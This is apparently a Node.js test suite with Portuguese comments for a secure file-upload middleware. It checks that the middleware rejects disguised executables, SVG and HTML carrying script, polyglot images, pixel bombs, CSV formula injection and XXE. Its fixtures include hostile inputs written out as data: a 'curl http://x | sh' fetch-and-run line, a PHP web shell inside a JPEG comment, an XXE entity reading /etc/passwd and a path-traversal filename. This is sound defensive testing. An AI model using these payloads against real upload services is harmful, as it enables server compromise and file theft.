const test = require('node:test');
const assert = require('node:assert');

const { uploadSeguro, inspecionarArquivo } = require('./uploadSeguro');

// ---------------------------------------------------------------------------
// Arquivos de teste montados byte a byte (so o cabecalho que importa).
// ---------------------------------------------------------------------------

function png(largura = 1, altura = 1, extra = Buffer.alloc(0)) {
  const ihdr = Buffer.alloc(25);
  ihdr.writeUInt32BE(13, 0);
  ihdr.write('IHDR', 4, 'latin1');
  ihdr.writeUInt32BE(largura, 8);
  ihdr.writeUInt32BE(altura, 12);
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), ihdr, extra]);
}

function jpeg(largura = 10, altura = 20, comentario = '') {
  const partes = [Buffer.from([0xff, 0xd8])];
  // APP0 (JFIF) curto
  partes.push(Buffer.from([0xff, 0xe0, 0x00, 0x07, 0x4a, 0x46, 0x49, 0x46, 0x00]));
  if (comentario) {
    const c = Buffer.from(comentario, 'latin1');
    const seg = Buffer.alloc(4);
    seg.writeUInt16BE(0xfffe, 0);
    seg.writeUInt16BE(c.length + 2, 2);
    partes.push(seg, c);
  }
  // SOF0: FF C0, tamanho 11, precisao 8, altura, largura, 1 componente
  const sof = Buffer.alloc(13);
  sof.writeUInt16BE(0xffc0, 0);
  sof.writeUInt16BE(11, 2);
  sof[4] = 8;
  sof.writeUInt16BE(altura, 5);
  sof.writeUInt16BE(largura, 7);
  sof[9] = 1;
  partes.push(sof, Buffer.from([0xff, 0xd9]));
  return Buffer.concat(partes);
}

function webp(largura = 100, altura = 50) {
  const b = Buffer.alloc(30);
  b.write('RIFF', 0, 'latin1');
  b.writeUInt32LE(22, 4);
  b.write('WEBP', 8, 'latin1');
  b.write('VP8X', 12, 'latin1');
  b.writeUIntLE(largura - 1, 24, 3);
  b.writeUIntLE(altura - 1, 27, 3);
  return b;
}

// ---------------------------------------------------------------------------
// inspecionarArquivo
// ---------------------------------------------------------------------------

test('imagem: aceita PNG, JPEG e WebP reais e devolve o tipo detectado', () => {
  assert.deepStrictEqual(inspecionarArquivo(png(), 'imagem'), { ok: true, mime: 'image/png', extensao: 'png' });
  assert.deepStrictEqual(inspecionarArquivo(jpeg(), 'imagem'), { ok: true, mime: 'image/jpeg', extensao: 'jpg' });
  assert.deepStrictEqual(inspecionarArquivo(webp(), 'imagem'), { ok: true, mime: 'image/webp', extensao: 'webp' });
});

test('imagem: recusa executavel renomeado pra .jpg', () => {
  const exe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200, 0x90)]);
  const r = inspecionarArquivo(exe, 'imagem');
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.status, 415);
  assert.match(r.motivo, /PE\/MZ/);
});

test('imagem: recusa ELF, script #!, ZIP e PDF', () => {
  for (const conteudo of [
    Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]),
    Buffer.from('#!/bin/sh\ncurl http://x | sh\n'),
    Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0]),
    Buffer.from('%PDF-1.7\n'),
  ]) {
    const r = inspecionarArquivo(conteudo, 'imagem');
    assert.strictEqual(r.ok, false, conteudo.toString('latin1'));
    assert.strictEqual(r.status, 415);
  }
});

test('imagem: recusa SVG (com ou sem script) e HTML', () => {
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  const svgLimpo = Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>');
  const html = Buffer.from('<html><body onload="x()"></body></html>');
  for (const c of [svg, svgLimpo, html]) {
    const r = inspecionarArquivo(c, 'imagem');
    assert.strictEqual(r.ok, false);
    assert.strictEqual(r.status, 415);
  }
});

test('imagem: recusa poliglota (JPEG valido com PHP/script no comentario)', () => {
  const r1 = inspecionarArquivo(jpeg(10, 10, '<?php system($_GET["c"]); ?>'), 'imagem');
  assert.strictEqual(r1.ok, false);
  assert.match(r1.motivo, /codigo embutido/);
  const r2 = inspecionarArquivo(png(1, 1, Buffer.from('<script>fetch("//x")</script>')), 'imagem');
  assert.strictEqual(r2.ok, false);
});

test('imagem: recusa bomba de pixels e imagem sem dimensoes', () => {
  const bomba = inspecionarArquivo(png(50000, 50000), 'imagem');
  assert.strictEqual(bomba.ok, false);
  assert.strictEqual(bomba.status, 413);
  const truncado = inspecionarArquivo(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), 'imagem');
  assert.strictEqual(truncado.ok, false);
});

test('tamanho: recusa vazio e acima do limite do perfil', () => {
  assert.strictEqual(inspecionarArquivo(Buffer.alloc(0), 'imagem').status, 400);
  const grande = Buffer.concat([png(), Buffer.alloc(5 * 1024 * 1024)]);
  assert.strictEqual(inspecionarArquivo(grande, 'imagem').status, 413);
  assert.strictEqual(inspecionarArquivo(Buffer.from('a;b\n1;2\n'), 'csv', { tamanhoMax: 4 }).status, 413);
});

test('csv: aceita texto UTF-8 (com BOM) e recusa binario, HTML e UTF-16', () => {
  assert.strictEqual(inspecionarArquivo(Buffer.from('nome;cnpj\nAcme;123\n'), 'csv').ok, true);
  const comBom = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('nome;cnpj\n')]);
  assert.strictEqual(inspecionarArquivo(comBom, 'csv').ok, true);
  assert.strictEqual(inspecionarArquivo(Buffer.from('nome\0cnpj'), 'csv').ok, false);
  assert.strictEqual(inspecionarArquivo(Buffer.from('<html><script>x</script></html>'), 'csv').ok, false);
  assert.strictEqual(inspecionarArquivo(Buffer.from([0xff, 0xfe, 0x6e, 0x00]), 'csv').ok, false);
  assert.strictEqual(inspecionarArquivo(Buffer.from('nome\n=HYPERLINK("javascript:alert(1)")\n'), 'csv').ok, false);
});

test('xml: aceita NF-e simples e recusa DOCTYPE/ENTITY (XXE) e nao-XML', () => {
  const nfe = '<?xml version="1.0" encoding="UTF-8"?><nfeProc versao="4.00"><NFe/></nfeProc>';
  assert.deepStrictEqual(inspecionarArquivo(Buffer.from(nfe), 'xml'), { ok: true, mime: 'application/xml', extensao: 'xml' });
  const xxe = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>';
  assert.strictEqual(inspecionarArquivo(Buffer.from(xxe), 'xml').ok, false);
  assert.strictEqual(inspecionarArquivo(Buffer.from('isso nao e xml'), 'xml').ok, false);
});

test('perfil desconhecido e erro de programacao', () => {
  assert.throws(() => inspecionarArquivo(png(), 'video'), /Perfil de upload desconhecido/);
  assert.throws(() => uploadSeguro('video'), /Perfil de upload desconhecido/);
});

// ---------------------------------------------------------------------------
// Middleware
// ---------------------------------------------------------------------------

function resFalso() {
  return {
    codigo: null,
    corpo: null,
    status(c) { this.codigo = c; return this; },
    json(b) { this.corpo = b; return this; },
  };
}

function executar(middleware, req) {
  const res = resFalso();
  let passou = false;
  middleware(req, res, () => { passou = true; });
  return { passou, res };
}

test('middleware: arquivo valido passa, mimetype vira o real e ganha nome aleatorio', () => {
  // Navegador disse PNG, mas o conteudo e JPEG: vale o conteudo.
  const req = { file: { originalname: '../../etc/x.png', mimetype: 'image/png', buffer: jpeg() } };
  const { passou } = executar(uploadSeguro('imagem'), req);
  assert.strictEqual(passou, true);
  assert.strictEqual(req.file.mimetype, 'image/jpeg');
  assert.strictEqual(req.file.mimeDeclarado, 'image/png');
  assert.match(req.file.nomeSeguro, /^[0-9a-f]{32}\.jpg$/);

  const req2 = { file: { mimetype: 'image/jpeg', buffer: jpeg() } };
  executar(uploadSeguro('imagem'), req2);
  assert.notStrictEqual(req2.file.nomeSeguro, req.file.nomeSeguro);
});

test('middleware: arquivo malicioso para com 415 e nao chama o handler', () => {
  const avisoOriginal = console.warn;
  console.warn = () => {};
  try {
    const req = { ip: '10.0.0.1', file: { mimetype: 'image/jpeg', buffer: Buffer.from('MZ\x90\x00') } };
    const { passou, res } = executar(uploadSeguro('imagem'), req);
    assert.strictEqual(passou, false);
    assert.strictEqual(res.codigo, 415);
    assert.ok(res.corpo.erro);
  } finally {
    console.warn = avisoOriginal;
  }
});

test('middleware: sem arquivo deixa o handler decidir; varios arquivos sao todos checados', () => {
  assert.strictEqual(executar(uploadSeguro('imagem'), {}).passou, true);

  const avisoOriginal = console.warn;
  console.warn = () => {};
  try {
    const req = { files: { fotos: [{ buffer: png() }, { buffer: Buffer.from('<svg onload=alert(1)>') }] } };
    const { passou, res } = executar(uploadSeguro('imagem'), req);
    assert.strictEqual(passou, false);
    assert.strictEqual(res.codigo, 415);
  } finally {
    console.warn = avisoOriginal;
  }
});

test('middleware: multer em disco (sem buffer) e recusado em vez de passar sem checar', () => {
  const { passou, res } = executar(uploadSeguro('csv'), { file: { path: '/tmp/x.csv' } });
  assert.strictEqual(passou, false);
  assert.strictEqual(res.codigo, 500);
});
